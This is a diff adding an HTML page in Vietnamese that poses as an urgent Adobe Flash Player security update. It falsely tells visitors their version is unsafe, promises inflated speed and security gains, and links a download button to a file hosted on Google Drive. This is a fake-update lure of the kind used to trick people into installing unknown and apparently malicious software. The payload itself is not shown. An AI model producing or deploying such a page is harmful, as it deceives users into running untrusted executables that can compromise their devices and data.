@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Adobe Flash Player - Bản cập nhật mới nhất</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 600px;
+            width: 100%;
+            padding: 40px;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: #FF3B30;
+            border-radius: 20px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: white;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        .alert {
+            background: #FFF3CD;
+            border-left: 4px solid #FFC107;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+            border-radius: 8px;
+        }
+        .version {
+            background: #E8F4FD;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-family: monospace;
+        }
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #28a745, #20c997);
+            color: white;
+            padding: 15px 40px;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 18px;
+            margin: 20px 0;
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(40,167,69,0.3);
+        }
+        .download-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(40,167,69,0.4);
+        }
+        .warning {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+        }
+        .features {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        .feature {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            🎬
+        </div>
+        <h1>Adobe Flash Player</h1>
+        <p>Bản cập nhật bảo mật quan trọng</p>
+        
+        <div class="alert">
+            <strong>⚠️ Yêu cầu cập nhật ngay!</strong><br>
+            Hệ thống phát hiện phiên bản Adobe Flash Player của bạn đã lỗi thời. 
+            Để tiếp tục xem nội dung, vui lòng tải xuống bản cập nhật mới nhất.
+        </div>
+        
+        <div class="version">
+            Phiên bản hiện tại: 32.0.0.344 (Không an toàn)<br>
+            Phiên bản mới nhất: 34.0.0.315 (Bảo mật)
+        </div>
+        
+        <a href="https://drive.google.com/uc?export=download&id=13l69bVOg2y9kT2jQd6CPMcoXVNFFJ-6F" class="download-btn" id="downloadBtn">
+            📥 Tải xuống ngay
+        </a>
+        
+        <div class="features">
+            <div class="feature">✅ Tăng tốc 300%</div>
+            <div class="feature">🔒 Bảo mật cao cấp</div>
+            <div class="feature">🎮 Chơi game mượt mà</div>
+        </div>
+        
+        <div class="warning">
+            * Yêu cầu khởi động lại trình duyệt sau khi cài đặt
+        </div>
+    </div>
+</body>
+</html>
